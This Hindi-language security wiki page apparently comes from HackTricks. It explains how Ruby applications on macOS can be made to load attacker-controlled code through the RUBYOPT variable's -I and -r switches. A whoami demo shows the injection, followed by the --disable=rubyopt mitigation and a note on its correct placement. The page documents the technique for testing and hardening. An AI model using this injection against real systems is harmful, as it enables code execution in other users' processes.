# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby किसी script को चलाने से पहले `RUBYOPT` environment variable से समर्थित command-line switches को parse करता है। Ruby `RUBYOPT` में `-e` के माध्यम से code execution को अस्वीकार करता है, लेकिन `-I` किसी library-search directory को सबसे आगे जोड़ सकता है और `-r` किसी library की आवश्यकता कर सकता है। इसलिए, attacker-controlled environment variables के साथ Ruby launch करने वाली process को attacker-controlled Ruby code load करने के लिए बाध्य किया जा सकता है।<sup>[[1]](#references)</sup>

`/tmp/inject.rb` बनाएं:
```ruby:inject.rb
puts `whoami`
```
`hello.rb` जैसा एक सुरक्षित Ruby script बनाएँ:
```ruby:hello.rb
puts 'Hello, World!'
```
इसे नियंत्रित `RUBYOPT` मान के साथ चलाएँ:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
इस व्यवहार को अक्षम करने के लिए, script name से **पहले** `--disable=rubyopt` (या `--disable-rubyopt`) पास करें:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
`hello.rb` के बाद लिखा गया option script को `ARGV` में पास किया जाता है; यह Ruby द्वारा `RUBYOPT` की पहले की processing को disable नहीं करता।<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## References

- [1] [Ruby दस्तावेज़ीकरण - Ruby कमांड-लाइन विकल्प](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
